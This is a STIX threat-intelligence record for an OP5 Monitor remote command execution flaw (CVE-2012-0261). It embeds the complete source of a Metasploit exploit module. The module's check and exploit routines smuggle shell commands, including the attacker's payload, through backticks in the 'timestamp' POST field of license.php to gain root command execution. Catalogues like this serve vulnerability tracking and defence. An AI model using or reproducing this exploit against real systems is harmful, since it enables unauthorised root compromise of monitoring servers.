{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--99a43923-822f-46d9-aacd-31f7941333a4",
    "created": "2024-08-14T17:09:06.951769Z",
    "modified": "2024-08-14T17:09:06.951773Z",
    "name": "OP5 license.php Remote Command Execution",
    "description": " This module exploits an arbitrary root command execution vulnerability in the OP5 Monitor license.php. Ekelow has confirmed that OP5 Monitor versions 5.3.5 5.4.0, 5.4.2, 5.5.0, 5.5.1 are vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/op5_license.rb",
            "external_id": "op5_license.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0261"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20140724161718/http://secunia.com/advisories/47417/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'OP5 license.php Remote Command Execution',\n      'Description' => %q{\n        This module exploits an arbitrary root command execution vulnerability in the\n        OP5 Monitor license.php. Ekelow has confirmed that OP5 Monitor versions 5.3.5,\n        5.4.0, 5.4.2, 5.5.0, 5.5.1 are vulnerable.\n      },\n      'Author'     => [ 'Peter Osterberg <j[at]vel.nu>' ],\n      'License'    => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2012-0261'],\n          ['OSVDB', '78064'],\n          ['URL', 'http://web.archive.org/web/20140724161718/http://secunia.com/advisories/47417/'],\n        ],\n      'Privileged' => true,\n      'Payload'    =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'BadChars'    => '`\\\\|',\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'perl ruby python',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2012-01-05',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(443),\n          OptString.new('URI', [true, \"The full URI path to license.php\", \"/license.php\"]),\n        ])\n  end\n\n  def check\n    vprint_status(\"Attempting to detect if the OP5 Monitor is vulnerable...\")\n    vprint_status(\"Sending request to https://#{rhost}:#{rport}#{datastore['URI']}\")\n\n    # Try running/timing 'ping localhost' to determine is system is vulnerable\n    start = Time.now\n\n    data = 'timestamp=1317050333`ping -c 10 127.0.0.1`&action=install&install=Install';\n    res = send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI']),\n      'method'  => 'POST',\n      'proto'   => 'HTTPS',\n      'data'    => data,\n      'headers' =>\n      {\n        'Connection'     => 'close',\n      }\n    }, 25)\n    elapsed = Time.now - start\n    if elapsed >= 5\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Sending request to https://#{rhost}:#{rport}#{datastore['URI']}\")\n\n    data = 'timestamp=1317050333`' + payload.encoded + '`&action=install&install=Install';\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI']),\n      'method'  => 'POST',\n      'proto'   => 'HTTPS',\n      'data'    => data,\n      'headers' =>\n      {\n        'Connection'     => 'close',\n      }\n    }, 25)\n\n    if(not res)\n      if session_created?\n        print_status(\"Session created, enjoy!\")\n      else\n        print_error(\"No response from the server\")\n      end\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-05",
    "x_mitre_platforms": [
        "unix'"
    ]
}